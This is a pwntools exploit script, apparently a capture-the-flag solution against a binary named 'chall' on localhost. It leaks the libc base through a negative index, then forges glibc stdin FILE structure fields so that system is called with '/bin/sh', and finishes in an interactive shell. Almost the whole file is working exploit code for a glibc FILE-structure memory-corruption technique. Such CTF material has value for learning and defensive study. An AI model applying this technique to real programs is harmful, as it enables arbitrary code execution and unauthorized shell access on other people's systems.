#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11101 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 11101)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+728
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
libc = exe.libc
io.sendlineafter(": ","-3")
io.recvuntil(" : ")
libc.address = int(io.recvline()[:-1],16) - libc.sym['_IO_2_1_stdout_']
print hex(libc.address)
io.sendlineafter(": ","-6")
p = ''
p += p64(libc.sym['_IO_2_1_stdin_']-1) # libc.address + 0x219040-1
p += p64(libc.sym['_IO_2_1_stdout_']) *3
# p =  p.ljust(8*3,"\x00")
p += p64(1)*(5+3)
p += p64(libc.sym['_IO_2_1_stdin_']) # _IO_2_1_stdin_
io.sendlineafter(": ",p)

sleep(0.1)
p = ''
p += p64(0x00000000fbad2088) # _flags 0xfbad2887
p += p64(libc.address + 0x219040) # _IO_read_ptr
p += p64(libc.address + 0x219040+0x8) # _IO_read_end
p += p64(libc.address + 0x219040) # _IO_read_base
p += p64(libc.address + 0x219040) # _IO_write_base
p += p64(libc.address + 0x219040) # _IO_write_ptr
p += p64(libc.address + 0x219040) # _IO_write_end
p += p64(libc.address + 0x219160)+p64(libc.address + 0x219160+0x1000) # _IO_buf_base + _IO_buf_end
io.send(p)

sleep(0.1)
p = p64(libc.sym['system'])
p += '\x00'*(0x940-8)
p += p64(0x00000000fbad2088) # _flags 0xfbad2887
p += p64(libc.address + 0x219040) # _IO_read_ptr
p += p64(libc.address + 0x219040+0x8) # _IO_read_end
p += p64(libc.address + 0x219040) # _IO_read_base
p += p64(libc.address + 0x219040) # _IO_write_base
p += p64(libc.address + 0x219040) # _IO_write_ptr
p += p64(libc.address + 0x219040) # _IO_write_end
p += p64(libc.address + 0x219160)+p64(libc.address + 0x219160+0x1000) # _IO_buf_base + _IO_buf_end
p += "/bin/sh\x00"
io.send(p)

io.interactive()

